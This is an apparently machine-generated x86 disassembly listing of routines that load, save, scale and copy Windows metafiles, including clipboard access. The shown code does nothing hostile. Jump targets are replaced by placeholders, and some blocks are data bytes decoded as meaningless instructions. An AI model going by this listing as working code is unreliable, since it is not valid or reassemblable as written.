push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
lea eax [ ebp - 0x410 ]
push eax
call CreatePalette
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
mov [ edx + 0x14 ] eax
and [ ebp - 0xc ] 0xff
sub_4129f8
push ebp
mov ebp esp
add esp 0xffffff90
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x64
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
imul eax [ ebp - 0x20 ] 0x64
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_412a88
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413108
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43eac4
push eax
mov eax [ ebp - 0x8 ]
call sub_43ea80
pop ecx
sub ecx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412c90
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412ba8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ecx
pop ecx
pop ebp
retn
sub_412af4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
pop ecx
pop ebp
retn
sub_412b28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
cmp [ ebp - 0xc ] 0x4
jg r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413108
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412c90
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412ba8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412ba8
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_412af4
lea edx [ ebp - 0x74 ]
mov ecx 0x64
mov eax [ ebp - 0x8 ]
call sub_43eb18
cmp [ ebp - 0x4c ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x44 ]
call sub_44ba5c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_412c82
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x74 ]
mov ecx 0x64
call sub_44bbe8
mov ecx [ ebp - 0x44 ]
sub ecx 0x64
mov edx [ ebp - 0xc ]
add edx 0x64
mov eax [ ebp - 0x8 ]
call sub_43eb18
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x44 ]
push eax
call SetEnhMetaFileBits
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_410060
mov eax [ ebp - 0x10 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x54 ]
sub eax [ ebp - 0x5c ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x58 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c89
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0xc ]
call sub_44ba74
retn
call sub_410060
sub_412c90
push ebp
mov ebp esp
add esp 0xffffff60
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_412af4
lea edx [ ebp - 0x2a ]
mov ecx 0x16
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
cmp [ ebp - 0x2a ] 0x9ac6cdd7
jne r-xdata
call sub_410060
lea eax [ ebp - 0x2a ]
call sub_4110bc
cmp ax [ ebp - 0x16 ]
je r-xdata
movzx eax [ ebp - 0x1c ]
push eax
push 0x9ec
movsx eax [ ebp - 0x20 ]
movsx edx [ ebp - 0x24 ]
sub eax edx
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
mov [ edx + 0xc ] eax
movzx eax [ ebp - 0x1c ]
push eax
push 0x9ec
movsx eax [ ebp - 0x1e ]
movsx edx [ ebp - 0x22 ]
sub eax edx
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
mov [ edx + 0x10 ] eax
mov [ ebp - 0x3a ] 0x8
xor eax eax
mov [ ebp - 0x36 ] eax
xor eax eax
mov [ ebp - 0x32 ] eax
xor eax eax
mov [ ebp - 0x2e ] eax
lea eax [ ebp - 0x3a ]
push eax
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SetWinMetaFileBits
mov edx [ ebp - 0x14 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x60
sub [ ebp - 0xc ] 0x16
mov eax [ ebp - 0xc ]
call sub_44ba5c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_412e23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov dx [ ebp - 0x1c ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
lea eax [ ebp - 0x9e ]
push eax
push 0x64
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x3a ] 0x8
mov eax [ ebp - 0x7e ]
mov [ ebp - 0x36 ] eax
mov eax [ ebp - 0x7a ]
mov [ ebp - 0x32 ] eax
xor eax eax
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x3a ]
push eax
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SetWinMetaFileBits
mov edx [ ebp - 0x14 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_410060
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e2a
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_44ba74
retn
call sub_410060
sub_412e30
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_412eb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x24 ]
mov [ ebp - 0x9 ] al
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_4466f0
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_448540
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_411950
mov al [ ebp - 0x9 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ebd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x0
sub_412ed1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41337c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4132e8
jmp r-xdata
sub_412f10
push ebp
mov ebp esp
add esp 0xffffff90
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
mov eax [ rw-data ]
push eax
push 0x9ec
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_412fa8
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x64
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x24 ]
push eax
imul eax [ ebp - 0x1c ] 0x64
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_412fa8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x20 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_412fa8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41317c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_413004
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
xor edx edx
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41317c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_413070
push ebp
mov ebp esp
add esp 0xffffff90
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
mov eax [ rw-data ]
push eax
push 0x9ec
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_413004
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x64
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x28 ]
push eax
imul eax [ ebp - 0x20 ] 0x64
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_413004
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x1c ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_413108
push ebp
mov ebp esp
add esp 0xffffff8c
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_43eac4
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_43ea80
sub ebx eax
mov [ ebp - 0x10 ] ebx
cmp [ ebp - 0x10 ] 0x64
jle r-xdata
cmp [ ebp - 0x10 ] 0x64
jle r-xdata
lea edx [ ebp - 0x74 ]
mov ecx 0x64
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov cx 0x1
mov edx 0xffffff9c
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x74 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4c ] 0x464d4520
je r-xdata
mov al 0x1
sub_41317c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov ax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x18 ] ax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call CopyEnhMetaFileA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
sub_413250
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_43ea80
sub eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41337c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4132e8
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43eac4
sub eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov cx 0x2
xor edx edx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4132e8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_44ba5c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_413370
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_44ba74
retn
sub_41337c
push ebp
mov ebp esp
add esp 0xffffffd0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2e ]
xor ecx ecx
mov edx 0x16
call sub_44bd90
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2e ] 0x9ac6cdd7
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
mov ax [ eax + 0x18 ]
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x20 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x2e ]
mov ecx 0x16
mov eax [ ebp - 0x8 ]
call sub_43eb60
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43eb60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134bd
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_44ba74
retn
call sub_4100c0
push 0x9ec
movzx eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x24 ] ax
push 0x9ec
movzx eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x2e ]
call sub_4110bc
mov [ ebp - 0x1a ] ax
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4134d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_44ba5c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4134b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
push 0x8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x10 ]
jae r-xdata
sub_4134e4
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xe ] dx
mov [ ebp - 0x4 ] eax
push 0xe
call GetClipboardData
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call CopyEnhMetaFileA
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
lea eax [ ebp - 0x72 ]
push eax
push 0x64
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x52 ]
sub eax [ ebp - 0x5a ]
mov edx [ ebp - 0xc ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4e ]
sub eax [ ebp - 0x56 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_410028
sub_413590
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
mov [ eax ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call CopyEnhMetaFileA
mov edx [ ebp - 0xc ]
mov [ edx ] eax
sub_4135d8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
inc ecx
add [ eax + eax ] ah
add [ esp + edx * 8 ] ch
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x8 ] 0x38
inc ecx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x1dbffbd ] cl
inc eax
add [ eax ] al
inc [ eax ]
hlt
sub_413670
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41370e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413715
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4136e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_413844
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40fab8
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_40fa58
test al al
je r-xdata
sub_41371c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4137aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x8 ] eax
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_413844
sub_4137b8
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40f50c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_413808
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413844
mov dl [ ebp - 0x5 ]
